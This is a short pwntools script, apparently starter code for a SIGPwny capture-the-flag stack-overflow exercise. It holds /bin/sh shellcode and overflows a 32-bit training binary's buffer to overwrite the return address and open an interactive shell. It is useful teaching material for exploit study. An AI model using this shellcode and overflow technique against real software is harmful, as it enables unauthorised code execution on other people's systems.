################################
# SIGPwny Stack 5 Starter Code #
################################
from pwn import *

# 32-bit shellcode to execute /bin/sh
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Connect to challenge
# conn = remote('chal.sigpwny.com', 1356) # Remote
conn = process("./stack5")  # Local process
# conn = gdb.debug('./stack5') # Local process but with GDB
conn.recvuntil("= ")
# Step 0: Get buffer address given to us as an int
buf_addr = int(conn.recvline().decode().strip().split(" ")[-1][2:], 16)
print("Buffer is located at: " + hex(buf_addr))
# gdb.attach(conn)

# Step 1: Overflow the stack
buf = shellcode + b"A" * (32 - len(shellcode))

# Step 2: Encode return address
buf += p32(buf_addr)


# Send exploit
conn.sendline(buf)

# Never forget to go interactive
conn.interactive()

# Profit??
